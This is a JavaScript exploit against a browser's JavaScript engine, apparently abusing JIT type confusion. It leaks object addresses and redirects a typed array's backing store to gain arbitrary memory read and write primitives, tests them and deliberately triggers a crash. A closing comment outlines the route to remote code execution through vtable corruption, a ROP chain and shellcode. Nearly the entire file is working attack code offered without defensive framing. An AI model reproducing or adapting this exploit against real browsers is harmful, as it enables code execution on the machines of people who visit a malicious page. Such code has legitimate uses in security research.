var convert = new ArrayBuffer(0x100);
var u32 = new Uint32Array(convert);
var f64 = new Float64Array(convert);

var BASE = 0x100000000;

function hex(x) {
    return `0x${x.toString(16)}`
}

function bytes_to_u64(bytes) {
    return (bytes[0]+bytes[1]*0x100+bytes[2]*0x10000+bytes[3]*0x1000000
                +bytes[4]*0x100000000+bytes[5]*0x10000000000);
}

function i2f(x) {
    u32[0] = x % BASE;
    u32[1] = (x - (x % BASE)) / BASE;
    return f64[0];
}

function f2i(x) {
    f64[0] = x;
    return u32[0] + BASE * u32[1];
}

function fail(msg) {
    print("FAIL " + msg);
    throw null;
}

function setup() {
    var container = {a: {}};
    var master = new Float64Array(0x100);
    var victim = new Uint8Array(0x100);

    var objs = [];
    for (var i = 0; i < 100; i++) {
        let x = {x: 13.37, y:victim, z:container};
        objs[i] = {x: 'asd', p1: {}, p2: {}, p3: {}, p4: x, p5: x, p6: {}};
    }
    var o = objs[0];
    var a = new Float64Array(1024);

    function f(a, b) {
        let p = b;
        for (; p.x < 0; p = p.x)
            while (p === p) {}
        for (var i = 0; i < 10000000; ++i){ }
        if (action==1) {
            victim_addr_f = a[3];
            container_addr_f = a[4];
        } else {
            a[7] = victim_addr_f;
        }
    }

    action = 1;
    for (var j = 0; j < 5; ++j)
        f(a, o);

    var victim_addr = f2i(victim_addr_f);
    var container_addr = f2i(container_addr_f);
    //print('victim @ ' + hex(victim_addr) + ' / container @ ' + hex(container_addr));

    var objs = [];
    for (var i = 0; i < 100; i++) {
        objs[i] = {x: 'asd', p1: {}, p2: {}, p3: {}, p4: {}, p5: master};
    }
    var o = objs[0];

    action = 2;
    for (var j = 0; j < 5; ++j)
        f(a, o);

    function set_addr(where) {
        master[7] = i2f(where);
    }

    function read64(where) {
        set_addr(where);
        var res = 0;
        for (var i = 7; i >= 0; --i) {
            res = res*0x100 + victim[i];
        }
        return res;
    }

    function read48(where) {
        set_addr(where);
        var res = 0;
        for (var i = 5; i >= 0; --i) {
            res = res*0x100 + victim[i];
        }
        return res;
    }

    function write64(where, what) {
        set_addr(where);
        for (var i = 0; i < 8; ++i) {
            victim[i] = what%0x100;
            what = (what-what%0x100)/0x100;
        }
    }

    function addrof2(x) {
        container.a = x;
        return read48(container_addr + 0x20);
    }

    function check() {
        print('master/victim: ' + hex(addrof2(master)) + ' ' + hex(addrof2(victim)));
    }

    function test() {
        var x = {x:0x1337};
        print(addrof2(x)+0x20);
        if (read48(addrof2(x)+0x20)%0x10000 != 0x1337) {
            check();
            fail("R/W does not work");
        } else
          print("R/W works!")
    }

    function crash() {
        var x = 1.384706273005e-312; // 0x0000004141414141
        var ix = f2i(x);
        read48(ix);
    }

    return {
        addrof: addrof2,
        read64: read64,
        write64: write64,
        read48: read48,
        check: check,
        test: test,
        crash: crash,
    };
}

function pwn() {
    var mem = setup();
    // r/w primitive
    mem.test();
    // read mem 0x0000004141414141
    mem.crash(); // crash
}

pwn();


/*
For RCE, a DOM object with a vtable is then corrupted and a virtual function called
on it. From there a small ROP chain is triggered which loads the shellcode and
jumps into it
*/
